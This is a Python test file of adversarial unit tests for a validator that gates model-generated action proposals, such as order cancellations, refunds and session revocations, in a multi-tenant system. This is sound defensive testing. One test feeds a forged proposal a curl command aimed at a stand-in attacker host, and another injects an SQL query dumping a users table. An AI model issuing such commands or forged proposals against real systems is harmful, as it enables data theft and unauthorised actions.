"""Adversarial unit coverage for the T075 deterministic proposal gate."""

from __future__ import annotations

from copy import deepcopy
from dataclasses import replace
from typing import Any

import pytest
from analysis.proposal_validator import (
    AuthoritativeAttribution,
    AuthoritativeResource,
    ProposalValidationContext,
    ProposalValidationStatus,
    ProposalValidator,
)
from packages.contracts.analysis_policy import (
    ActionType,
    AttributionLabel,
    ModelAnalysisRequest,
    ModelAnalysisResponse,
    ModelBudget,
    ProviderMode,
    TypedActionProposal,
)
from packages.contracts.common import CONTRACT_VERSION
from packages.contracts.connectors import ConnectorManifest, ConnectorMode, ConnectorType

TENANT_ID = "tenant-t075"
CASE_ID = "case-t075"
CORRELATION_ID = "correlation-t075"
ANALYSIS_ID = "analysis-t075"
EVIDENCE_ID = "evidence-t075"


def action_manifest(*, tenant_id: str = TENANT_ID) -> ConnectorManifest:
    return ConnectorManifest(
        tenant_id=tenant_id,
        correlation_id=CORRELATION_ID,
        connector_id="action-connector-t075",
        contract_version=CONTRACT_VERSION,
        connector_type=ConnectorType.ACTION,
        mode=ConnectorMode.SIMULATOR,
        resources=("sessions", "fulfillment", "orders", "payments", "profile_changes"),
        operations=tuple(action.value for action in ActionType),
        auth_scope=(f"{tenant_id}:action:t075",),
        request_schema="ActionConnectorRequest",
        response_schema="ActionConnectorResponse",
        timestamp_semantics="utc",
        idempotency_behavior="stable action identity",
        failure_states=("invalid", "unknown_result"),
    )


def resource(
    resource_id: str,
    resource_type: str,
    timeline_event_id: str,
    *,
    state: str = "created",
    attributes: dict[str, Any] | None = None,
) -> AuthoritativeResource:
    return AuthoritativeResource(
        resource_id=resource_id,
        resource_type=resource_type,
        tenant_id=TENANT_ID,
        case_id=CASE_ID,
        state=state,
        connector_id="action-connector-t075",
        evidence_references=(EVIDENCE_ID,),
        timeline_event_ids=(timeline_event_id,),
        attributes=attributes or {},
    )


def context(
    *,
    label: AttributionLabel = AttributionLabel.MALICIOUS,
    target: str = "order-t075",
    timeline_event_id: str = "timeline-order-t075",
    target_resource: AuthoritativeResource | None = None,
    uncertainty: frozenset[str] = frozenset(),
    **overrides: Any,
) -> ProposalValidationContext:
    target_value = target_resource or resource(target, "orders", timeline_event_id)
    return ProposalValidationContext(
        tenant_id=TENANT_ID,
        case_id=CASE_ID,
        correlation_id=CORRELATION_ID,
        analysis_id=ANALYSIS_ID,
        evidence_references=frozenset({EVIDENCE_ID}),
        timeline_events={
            timeline_event_id: {
                "timeline_event_id": timeline_event_id,
                "tenant_id": TENANT_ID,
                "case_id": CASE_ID,
                "evidence_references": (EVIDENCE_ID,),
                "event_payload": {"order_id": target_value.resource_id},
            }
        },
        attributions={
            timeline_event_id: AuthoritativeAttribution(
                timeline_event_id=timeline_event_id,
                tenant_id=TENANT_ID,
                case_id=CASE_ID,
                label=label,
                confidence=0.95,
                evidence_references=(EVIDENCE_ID,),
                rationale="Deterministic fixture attribution.",
                method="rules",
                model_or_rules_version="rules-v1.0.0",
            )
        },
        resources={target_value.resource_id: target_value},
        connectors={"action-connector-t075": action_manifest()},
        action_connector_ids={action.value: "action-connector-t075" for action in ActionType},
        uncertainty_references=uncertainty,
        **overrides,
    )


def proposal(
    *,
    action_type: ActionType = ActionType.CANCEL_ORDER,
    target_resource: str = "order-t075",
    tenant_id: str = TENANT_ID,
    case_id: str = CASE_ID,
    correlation_id: str = CORRELATION_ID,
    analysis_id: str = ANALYSIS_ID,
    parameters: dict[str, Any] | None = None,
    evidence_references: tuple[str, ...] = (EVIDENCE_ID,),
    attribution_references: tuple[str, ...] = ("timeline-order-t075",),
    requested_amount_minor: int | None = None,
    currency: str | None = None,
    proposal_id: str = "proposal-t075",
    idempotency_key: str = "idempotency-t075",
) -> TypedActionProposal:
    return TypedActionProposal(
        tenant_id=tenant_id,
        correlation_id=correlation_id,
        proposal_id=proposal_id,
        case_id=case_id,
        action_type=action_type,
        target_resource=target_resource,
        parameters=parameters or {"reason": "deterministic review"},
        rationale="The authoritative malicious activity requires review.",
        evidence_references=evidence_references,
        attribution_references=attribution_references,
        requested_amount_minor=requested_amount_minor,
        currency=currency,
        idempotency_key=idempotency_key,
        analysis_id=analysis_id,
    )


def validate(value: TypedActionProposal, state: ProposalValidationContext | None = None) -> Any:
    return ProposalValidator().validate(value, state or context())


def test_valid_same_tenant_same_case_proposal_is_ready_for_policy_only() -> None:
    result = validate(proposal())

    assert result.status is ProposalValidationStatus.VALID
    assert result.policy_evaluation_ready is True
    assert result.connector_id == "action-connector-t075"
    assert result.audit_record["side_effects"] is False
    assert result.remote_side_effects == ()


@pytest.mark.parametrize(
    ("field", "value"),
    (("tenant_id", "tenant-other"), ("case_id", "case-other"), ("correlation_id", "corr-other")),
)
def test_cross_scope_proposal_is_rejected(field: str, value: str) -> None:
    result = validate(proposal(**{field: value}))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("scope" in reason for reason in result.reasons)


def test_fabricated_evidence_reference_is_rejected() -> None:
    result = validate(proposal(evidence_references=("fabricated-evidence",)))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("unknown evidence" in reason for reason in result.reasons)


def test_fabricated_target_resource_is_rejected() -> None:
    result = validate(proposal(target_resource="order-not-authoritative"))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("authoritative state" in reason for reason in result.reasons)


def test_cross_tenant_authoritative_target_is_rejected() -> None:
    other_tenant_resource = AuthoritativeResource(
        resource_id="order-t075",
        resource_type="orders",
        tenant_id="tenant-other",
        case_id=CASE_ID,
        state="created",
        connector_id="action-connector-t075",
        evidence_references=(EVIDENCE_ID,),
        timeline_event_ids=("timeline-order-t075",),
    )

    result = validate(proposal(), context(target_resource=other_tenant_resource))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("resource crosses the tenant" in reason for reason in result.reasons)


def test_action_connector_operation_must_be_allowlisted() -> None:
    manifest = action_manifest().model_copy(
        update={
            "operations": tuple(
                action.value for action in ActionType if action is not ActionType.CANCEL_ORDER
            )
        }
    )
    state = replace(
        context(),
        connectors={"action-connector-t075": manifest},
    )

    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("not allowlisted" in reason for reason in result.reasons)


def test_connector_cannot_declare_an_unsupported_action_operation() -> None:
    manifest = action_manifest().model_copy(
        update={"operations": (*action_manifest().operations, "execute_payment")}
    )
    state = replace(
        context(),
        connectors={"action-connector-t075": manifest},
    )

    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("unsupported action operation" in reason for reason in result.reasons)


def test_missing_action_connector_declaration_is_rejected() -> None:
    state = replace(
        context(),
        connectors={},
        action_connector_ids={ActionType.CANCEL_ORDER.value: "missing-action-connector"},
    )

    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("not declared" in reason for reason in result.reasons)


def test_idempotency_key_collision_with_different_identity_is_rejected() -> None:
    state = context(existing_idempotency_keys={"idempotency-t075": "different-action-identity"})

    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("idempotency key" in reason for reason in result.reasons)


def test_unsupported_action_type_is_rejected_even_when_model_constructed_directly() -> None:
    forged_values = proposal().model_dump()
    forged_values["action_type"] = "execute_payment"
    forged = TypedActionProposal.model_construct(**forged_values)

    result = validate(forged)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("unsupported" in reason or "allowlisted" in reason for reason in result.reasons)


def test_malformed_action_payload_is_rejected() -> None:
    result = validate(proposal(parameters={"unexpected_target": "order-other"}))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("not allowlisted" in reason for reason in result.reasons)


def test_forged_typed_proposal_bypassing_t074_still_fails_closed() -> None:
    forged_values = proposal().model_dump()
    forged_values.update(
        case_id="case-other",
        parameters={"command": "curl https://attacker.invalid"},
    )
    forged = TypedActionProposal.model_construct(**forged_values)

    result = validate(forged)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("scope" in reason for reason in result.reasons)
    assert any("forbidden" in reason for reason in result.reasons)


def test_legitimate_activity_cannot_be_targeted_by_malicious_activity_elsewhere() -> None:
    state = context(label=AttributionLabel.LEGITIMATE)
    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("legitimate" in reason for reason in result.reasons)


def test_uncertain_activity_is_escalation_only_and_never_valid() -> None:
    state = context(
        label=AttributionLabel.UNCERTAIN, uncertainty=frozenset({"timeline-order-t075"})
    )
    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.ESCALATION_ONLY
    assert result.policy_evaluation_ready is False
    assert any("uncertain" in reason for reason in result.reasons)


def test_refund_is_bounded_by_authoritative_captured_payment_and_exposure() -> None:
    payment = resource(
        "payment-t075",
        "payments",
        "timeline-payment-t075",
        attributes={
            "state": "captured",
            "amount_minor": 10_000,
            "reimbursed_minor": 1_000,
            "currency": "INR",
            "payment_source": "original-source-t075",
        },
    )
    state = context(
        target="payment-t075",
        timeline_event_id="timeline-payment-t075",
        target_resource=payment,
        exposure={"currency": "INR", "remaining_exposure_minor": 9_000},
    )
    result = validate(
        proposal(
            action_type=ActionType.REFUND_PAYMENT,
            target_resource="payment-t075",
            attribution_references=("timeline-payment-t075",),
            requested_amount_minor=9_001,
            currency="INR",
        ),
        state,
    )

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("exceeds" in reason for reason in result.reasons)


def test_refund_cannot_choose_an_arbitrary_destination() -> None:
    payment = resource(
        "payment-t075",
        "payments",
        "timeline-payment-t075",
        attributes={
            "state": "captured",
            "amount_minor": 10_000,
            "reimbursed_minor": 0,
            "currency": "INR",
            "payment_source": "original-source-t075",
        },
    )
    state = context(
        target="payment-t075",
        timeline_event_id="timeline-payment-t075",
        target_resource=payment,
    )
    result = validate(
        proposal(
            action_type=ActionType.REFUND_PAYMENT,
            target_resource="payment-t075",
            attribution_references=("timeline-payment-t075",),
            requested_amount_minor=1_000,
            currency="INR",
            parameters={"refund_destination": "other-source"},
        ),
        state,
    )

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("forbidden" in reason or "allowlisted" in reason for reason in result.reasons)


def test_refund_currency_must_match_authoritative_currency() -> None:
    payment = resource(
        "payment-t075",
        "payments",
        "timeline-payment-t075",
        attributes={
            "state": "captured",
            "amount_minor": 10_000,
            "currency": "INR",
            "payment_source": "original-source-t075",
        },
    )
    state = context(
        target="payment-t075",
        timeline_event_id="timeline-payment-t075",
        target_resource=payment,
    )
    result = validate(
        proposal(
            action_type=ActionType.REFUND_PAYMENT,
            target_resource="payment-t075",
            attribution_references=("timeline-payment-t075",),
            requested_amount_minor=1_000,
            currency="USD",
        ),
        state,
    )

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("currency" in reason for reason in result.reasons)


def test_stale_analysis_input_is_rejected_before_policy() -> None:
    state = context(
        input_versions={"timeline": "timeline-v1"},
        authoritative_versions={"timeline": "timeline-v2"},
    )
    result = validate(proposal(), state)

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("stale" in reason for reason in result.reasons)


def test_validation_is_replay_deterministic_for_same_proposal_and_state() -> None:
    value = proposal()
    first = validate(value)
    replay = validate(deepcopy(value))

    assert first == replay
    assert first.validation_checksum
    assert first.authoritative_input_checksum


def test_forbidden_capability_in_metadata_or_payload_is_rejected() -> None:
    result = validate(proposal(parameters={"metadata": {"sql": "SELECT * FROM users"}}))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("forbidden" in reason for reason in result.reasons)


def test_action_specific_target_and_state_checks_are_fail_closed() -> None:
    session = resource(
        "session-t075",
        "sessions",
        "timeline-session-t075",
        state="revoked",
    )
    state = context(
        target="session-t075",
        timeline_event_id="timeline-session-t075",
        target_resource=session,
    )
    result = validate(
        proposal(
            action_type=ActionType.REVOKE_SUSPICIOUS_SESSION,
            target_resource="session-t075",
            attribution_references=("timeline-session-t075",),
        ),
        state,
    )

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("revocable" in reason for reason in result.reasons)


def analysis_request() -> ModelAnalysisRequest:
    return ModelAnalysisRequest(
        tenant_id=TENANT_ID,
        correlation_id=CORRELATION_ID,
        case_id=CASE_ID,
        redacted_case_representation={"timeline": [{"timeline_event_id": "timeline-order-t075"}]},
        policy_version_id="policy-t075",
        budget=ModelBudget(max_tokens=64),
        provider_mode=ProviderMode.REPLAY,
        replay_label=ProviderMode.REPLAY,
    )


def test_t074_tenant_bound_response_is_accepted_without_changing_shared_contract() -> None:
    value = proposal()
    response = ModelAnalysisResponse(
        tenant_id=TENANT_ID,
        correlation_id=CORRELATION_ID,
        analysis_id=ANALYSIS_ID,
        provider="fixture-provider",
        model="fixture-model",
        proposals=(value,),
        uncertainty="review required",
    )
    # The shared response has no case_id; the local T074 subtype is deliberately
    # imported here so T075 proves the approved compatibility boundary.
    from agent.output_parser import TenantBoundAnalysisResponse

    bound_response = TenantBoundAnalysisResponse(
        **response.model_dump(),
        case_id=CASE_ID,
    )
    state = context(
        analysis_request=analysis_request(),
        analysis_response=bound_response,
        provider="fixture-provider",
        model="fixture-model",
        provider_mode=ProviderMode.REPLAY,
        replay_label=ProviderMode.REPLAY,
    )

    result = validate(value, state)

    assert result.status is ProposalValidationStatus.VALID


def test_plain_shared_response_without_case_binding_is_rejected() -> None:
    value = proposal()
    response = ModelAnalysisResponse(
        tenant_id=TENANT_ID,
        correlation_id=CORRELATION_ID,
        analysis_id=ANALYSIS_ID,
        provider="fixture-provider",
        model="fixture-model",
        proposals=(value,),
        uncertainty="review required",
    )
    result = validate(value, context(analysis_response=response))

    assert result.status is ProposalValidationStatus.REJECTED
    assert any("authoritative case" in reason for reason in result.reasons)
